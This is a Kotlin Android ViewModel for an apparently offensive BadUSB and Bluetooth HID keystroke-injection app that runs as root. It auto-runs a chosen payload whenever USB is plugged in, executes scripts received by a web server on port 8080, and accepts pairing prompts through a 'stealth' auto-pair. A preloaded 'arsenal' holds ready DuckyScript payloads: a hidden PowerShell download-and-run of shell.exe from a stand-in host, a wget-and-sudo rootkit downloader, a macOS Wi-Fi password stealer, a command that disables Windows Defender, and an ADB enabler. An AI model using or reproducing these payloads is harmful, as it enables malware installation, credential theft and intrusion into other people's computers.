package com.chimera.zpqmxr.ui

import android.content.Context
import android.net.Uri
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.chimera.zpqmxr.data.Payload
import com.chimera.zpqmxr.data.PayloadRepository
import com.chimera.zpqmxr.utils.BluetoothHidManager
import com.chimera.zpqmxr.utils.DuckyInterpreter
import com.chimera.zpqmxr.utils.RootUtils
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharingStarted
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.stateIn
import kotlinx.coroutines.launch
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.InputStreamReader

class MainViewModel(private val repository: PayloadRepository, private val applicationContext: Context) : ViewModel() {

    val btManager = BluetoothHidManager(applicationContext)
    private val interpreter = DuckyInterpreter(btManager)


    val uiState: StateFlow<List<Payload>> = repository.allPayloads
        .stateIn(
            scope = viewModelScope,
            started = SharingStarted.WhileSubscribed(5000),
            initialValue = emptyList()
        )

    val currentExecutionOutput = MutableStateFlow<String?>(null)
    val isExecuting = MutableStateFlow(false)
    val isRndisEnabled = MutableStateFlow(false)
    val isIsoMounted = MutableStateFlow(false)
    val selectedIsoPath = MutableStateFlow<String?>(null)
    
    private val webServer = com.chimera.zpqmxr.utils.WebServer(8080) { script ->
        executePayload(script)
    }

    fun savePayload(name: String, script: String) {
        viewModelScope.launch {
            repository.insert(Payload(name = name, script = script))
        }
    }
    
    fun updatePayload(id: Int, name: String, script: String) {
        viewModelScope.launch {
            repository.insert(Payload(id = id, name = name, script = script))
        }
    }

    fun deletePayload(id: Int) {
        viewModelScope.launch {
            repository.deleteById(id)
        }
    }

    val languages = com.chimera.zpqmxr.utils.DuckyCompiler.languages.keys.toList()
    
    private val sharedPreferences = applicationContext.getSharedPreferences("chimera_settings", Context.MODE_PRIVATE)
    
    val selectedLanguage = MutableStateFlow(sharedPreferences.getString("selected_lang", "US") ?: "US")

    val customGadgetPath = MutableStateFlow(sharedPreferences.getString("custom_gadget_path", "") ?: "")
    val customHidPath = MutableStateFlow(sharedPreferences.getString("custom_hid_path", "") ?: "")
    val isBiometricEnabled = MutableStateFlow(sharedPreferences.getBoolean("biometric_enabled", false))
    
    val autoRunPayloadId = MutableStateFlow(sharedPreferences.getInt("auto_run_payload_id", -1))

    fun setAutoRunPayload(payloadId: Int?) {
        val newId = payloadId ?: -1
        autoRunPayloadId.value = newId
        sharedPreferences.edit().putInt("auto_run_payload_id", newId).apply()
    }

    private var autoRunReceiver: com.chimera.zpqmxr.utils.AutoRunReceiver? = null

    fun updateCustomGadgetPath(path: String) {
        customGadgetPath.value = path
        sharedPreferences.edit().putString("custom_gadget_path", path).apply()
    }

    fun updateCustomHidPath(path: String) {
        customHidPath.value = path
        sharedPreferences.edit().putString("custom_hid_path", path).apply()
    }

    fun updateBiometricEnabled(enabled: Boolean) {
        isBiometricEnabled.value = enabled
        sharedPreferences.edit().putBoolean("biometric_enabled", enabled).apply()
    }

    fun selectLanguage(lang: String) {
        selectedLanguage.value = lang
        sharedPreferences.edit().putString("selected_lang", lang).apply()
    }

    fun executePayload(script: String) {
        viewModelScope.launch {
            isExecuting.value = true
            currentExecutionOutput.value = "Compiling DuckyScript (${selectedLanguage.value})...\n"
            val langId = com.chimera.zpqmxr.utils.DuckyCompiler.languages[selectedLanguage.value] ?: 0
            val bashScript = com.chimera.zpqmxr.utils.DuckyCompiler.compile(script, langId, customHidPath.value)
            currentExecutionOutput.value = currentExecutionOutput.value + "Executing via Root...\n--------------------------------\n"
            val output = RootUtils.executeScript(bashScript)
            currentExecutionOutput.value = currentExecutionOutput.value + output
            isExecuting.value = false
        }
    }
    
    val kernelVersion = System.getProperty("os.version") ?: "Unknown"
    val osName = System.getProperty("os.name") ?: "Unknown"
    
    val isRootGranted = MutableStateFlow(false)
    val rootVersionString = MutableStateFlow("Checking...")

    val hardwareScanResult = MutableStateFlow<String?>(null)

    fun performDeepHardwareScan() {
        viewModelScope.launch {
            isExecuting.value = true
            currentExecutionOutput.value = "Initiating Deep Hardware Scan via Native Interface...\n"
            try {
                val result = com.chimera.zpqmxr.utils.NativeBridge.performDeepHardwareScan()
                hardwareScanResult.value = result
                currentExecutionOutput.value = currentExecutionOutput.value + "\nScan Complete. Results available in Advanced."
            } catch (e: Exception) {
                currentExecutionOutput.value = currentExecutionOutput.value + "\nScan Failed: \${e.message}"
            }
            isExecuting.value = false
        }
    }

    fun setupKernelGadget() {
        viewModelScope.launch {
            isExecuting.value = true
            currentExecutionOutput.value = "Setting up ConfigFS Gadget (Rucky Approach)...\n"
            val output = com.chimera.zpqmxr.utils.RuckyGadgetSetup.setupAndEnableGadget(customGadgetPath.value)
            currentExecutionOutput.value = currentExecutionOutput.value + "\n" + output
            isExecuting.value = false
        }
    }

    fun disableKernelGadget() {
        viewModelScope.launch {
            isExecuting.value = true
            currentExecutionOutput.value = "Disabling Gadget...\n"
            val output = com.chimera.zpqmxr.utils.RuckyGadgetSetup.disableGadget(customGadgetPath.value)
            currentExecutionOutput.value = currentExecutionOutput.value + "\n" + output
            isExecuting.value = false
        }
    }

    fun startRndisWebRemote() {
        viewModelScope.launch {
            isExecuting.value = true
            currentExecutionOutput.value = "Starting RNDIS Web Remote...\n"
            val output = com.chimera.zpqmxr.utils.RndisGadgetManager.enableRndis()
            currentExecutionOutput.value = currentExecutionOutput.value + "\n" + output
            webServer.start()
            isRndisEnabled.value = true
            isExecuting.value = false
        }
    }

    fun stopRndisWebRemote() {
        viewModelScope.launch {
            isExecuting.value = true
            currentExecutionOutput.value = "Stopping RNDIS Web Remote...\n"
            val output = com.chimera.zpqmxr.utils.RndisGadgetManager.disableRndis()
            currentExecutionOutput.value = currentExecutionOutput.value + "\n" + output
            webServer.stop()
            isRndisEnabled.value = false
            isExecuting.value = false
        }
    }

    fun selectIsoFile(path: String) {
        selectedIsoPath.value = path
    }

    fun mountIsoFile() {
        val path = selectedIsoPath.value ?: return
        viewModelScope.launch {
            isExecuting.value = true
            currentExecutionOutput.value = "Mounting ISO: $path\n"
            val output = com.chimera.zpqmxr.utils.MassStorageGadgetManager.mountIso(path)
            currentExecutionOutput.value = currentExecutionOutput.value + "\n" + output
            isIsoMounted.value = true
            isExecuting.value = false
        }
    }

    fun unmountIsoFile() {
        viewModelScope.launch {
            isExecuting.value = true
            currentExecutionOutput.value = "Unmounting ISO...\n"
            val output = com.chimera.zpqmxr.utils.MassStorageGadgetManager.unmountIso()
            currentExecutionOutput.value = currentExecutionOutput.value + "\n" + output
            isIsoMounted.value = false
            isExecuting.value = false
        }
    }


    
    fun dismissExecutionOutput() {
        currentExecutionOutput.value = null
    }

    fun executePayloadBluetooth(script: String) {
        viewModelScope.launch {
            if (!btManager.isRegistered.value) {
                btManager.init()
            }
            if (!btManager.isConnected.value) {
                currentExecutionOutput.value = "Bluetooth HID is not connected to any host.\n\nPlease pair this phone with another device (PC/Mac/Phone) using the system Bluetooth settings. This app will act as a generic Keyboard."
                return@launch
            }
            isExecuting.value = true
            currentExecutionOutput.value = "Executing via Bluetooth HID (${selectedLanguage.value})...\n"
            val langId = com.chimera.zpqmxr.utils.DuckyCompiler.languages[selectedLanguage.value] ?: 0
            interpreter.execute(script, { log ->
                currentExecutionOutput.value = currentExecutionOutput.value + "\n" + log
            }, langId)
            currentExecutionOutput.value = currentExecutionOutput.value + "\n--------------------------------\nDone Execution."
            isExecuting.value = false
        }
    }

    fun autoPairBluetooth(mac: String) {
        viewModelScope.launch {
            if (!btManager.isRegistered.value) {
                btManager.init()
            }
            isExecuting.value = true
            currentExecutionOutput.value = "Starting Stealth Auto-Pair Sequence with $mac...\n"
            btManager.pairDeviceRoot(mac) { log ->
                currentExecutionOutput.value = currentExecutionOutput.value + "\n" + log
            }
            currentExecutionOutput.value = currentExecutionOutput.value + "\nListening for pairing prompts to accept automatically via Root..."
            isExecuting.value = false
        }
    }

    fun verifyHid() {
        viewModelScope.launch {
            isExecuting.value = true
            currentExecutionOutput.value = "Checking HID Gadget Support...\n"
            val script = "ls -l /dev/hid* 2>/dev/null || echo 'No HID devices found'"
            val output = RootUtils.executeScript(script)
            currentExecutionOutput.value = currentExecutionOutput.value + "--------------------------------\n" + output + "\n\nIf you see /dev/hidg0 or /dev/hid.gs1, your device supports BadUSB!"
            isExecuting.value = false
        }
    }

    fun preloadChimeraArsenal() {
        viewModelScope.launch {
            val templates = listOf(
                Payload(name = "Win Reverse Shell (Powershell)", script = "DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -windowstyle hidden -Command \"Invoke-WebRequest -Uri http://your-ip:8000/shell.exe -OutFile C:\\Temp\\shell.exe; C:\\Temp\\shell.exe\"\nENTER"),
                Payload(name = "Linux Rootkit Downloader", script = "DELAY 1000\nCTRL ALT t\nDELAY 500\nSTRING wget http://your-ip/rootkit.sh -O /tmp/r.sh && chmod +x /tmp/r.sh && sudo /tmp/r.sh\nENTER"),
                Payload(name = "Mac Wi-Fi Stealer", script = "DELAY 1000\nGUI SPACE\nDELAY 500\nSTRING terminal\nENTER\nDELAY 500\nSTRING security find-generic-password -wa 'Wi-Fi Network Name' | \nENTER"),
                Payload(name = "Windows Disable Defender", script = "DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring \$true\"\nENTER"),
                Payload(name = "Android ADB Enable & Exploit", script = "DELAY 1000\nSTRING su -c 'setprop persist.sys.usb.config adb; stop adbd; start adbd'\nENTER")
            )
            templates.forEach { repository.insert(it) }
        }
    }

    suspend fun readTextFromUri(uri: Uri): String? = withContext(Dispatchers.IO) {
        try {
            val inputStream = applicationContext.contentResolver.openInputStream(uri)
            val reader = BufferedReader(InputStreamReader(inputStream))
            val stringBuilder = StringBuilder()
            var line: String?
            while (reader.readLine().also { line = it } != null) {
                stringBuilder.append(line).append("\n")
            }
            inputStream?.close()
            stringBuilder.toString().trimEnd()
        } catch (e: Exception) {
            e.printStackTrace()
            null
        }
    }

    init {
        viewModelScope.launch {
            isRootGranted.value = RootUtils.isRootAvailable()
            rootVersionString.value = RootUtils.getRootVersion()
        }

        autoRunReceiver = com.chimera.zpqmxr.utils.AutoRunReceiver {
            viewModelScope.launch {
                val currentAutoRunId = autoRunPayloadId.value
                if (currentAutoRunId != -1) {
                    val payloadToRun = uiState.value.find { it.id == currentAutoRunId }
                    if (payloadToRun != null) {
                        currentExecutionOutput.value = "USB Plugged In! Auto-running ${payloadToRun.name}...\n"
                        executePayload(payloadToRun.script)
                    }
                }
            }
        }
        val filter = android.content.IntentFilter("android.hardware.usb.action.USB_STATE")
        applicationContext.registerReceiver(autoRunReceiver, filter)
    }

    override fun onCleared() {
        super.onCleared()
        try {
            autoRunReceiver?.let {
                applicationContext.unregisterReceiver(it)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
